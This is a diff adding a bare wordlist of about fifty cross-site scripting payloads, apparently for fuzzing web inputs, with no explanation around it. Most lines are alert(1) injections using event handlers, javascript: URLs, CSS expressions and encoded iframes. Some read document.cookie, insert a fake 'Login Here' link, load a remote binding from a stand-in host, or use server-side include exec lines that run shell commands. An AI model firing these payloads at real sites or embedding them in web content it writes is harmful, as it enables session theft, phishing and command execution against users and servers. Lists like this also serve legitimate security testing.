@@ -1,0 +1,53 @@
+"><A HREF="https://www.cia.gov/">Login Here </A>
+"><iframe src="https://www.nasa.gov/">
+"><script>prompt(document.cookie)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<svg><script>alert(1)</script>
+<math><mtext></mtext><script>alert(1)</script>
+<img src=x:alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<input type="text" value="XSS" onfocus="alert(1)">
+<div onmouseover=alert(1)>XSS</div>
+<video><source onerror="alert(1)">
+<input onfocus=alert(1) autofocus>
+<textarea autofocus onfocus=alert(1)>
+<input value="``onmouseover=alert(1)//">
+<form><button formaction="javascript:alert(1)">CLICK ME
+<button onclick=alert(1)>CLICK</button>
+<a href="javascript:alert(1)">CLICK ME</a>
+<svg onload="javascript:alert(1)">
+<iframe onload="alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<marquee onstart=alert(1)>
+<isindex action="javascript:alert(1)">
+<xss style="x:expression(alert(1))">
+<link rel="stylesheet" href="javascript:alert(1)">
+<base href="javascript:alert(1)//">
+<style>@import 'javascript:alert(1)';</style>
+<table background="javascript:alert(1)">
+<style>body{background:url("javascript:alert(1)");}</style>
+<style>*{xss:expression(alert(1))}</style>
+<style>body{-moz-binding:url("http://your.com/xss.xml#xss")}</style>
+<xml src="javascript:alert(1)">
+<xss xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></xss>
+<x xmlns:ev="http://www.w3.org/2001/xml-events"><ev:listener event="load" handler="javascript:alert(1)"/></x>
+<blink onstart=alert(1)>
+<meta charset="x-imap4-utf-7"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<xml><script>document.write("<img src=x onerror=alert(1)>")</script></xml>
+<plaintext><a href=javascript:alert(1)>CLICK ME
+<!--#exec cmd="/bin/echo 'Content-Type: text/html'; echo '<script>alert(1)</script>'" -->
+<!--#exec cmd="echo 'Content-Type: text/html'; echo '<script>alert(1)</script>'" -->
+<!--#exec cmd="perl -e 'print \"Content-type: text/html\n\n<script>alert(1)</script>\"'"-->
+<!--#exec cmd="cmd.exe /c echo Content-type: text/html && echo <script>alert(1)</script>" -->
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<frame src="javascript:alert(1)"></frame>
+<object type="text/html" data="javascript:alert(1)"></object>
+<svg><script>alert(1)</script></svg>
+<input onfocus=alert(1) autofocus>
+<iframe src="javascript:alert(1)"></iframe>
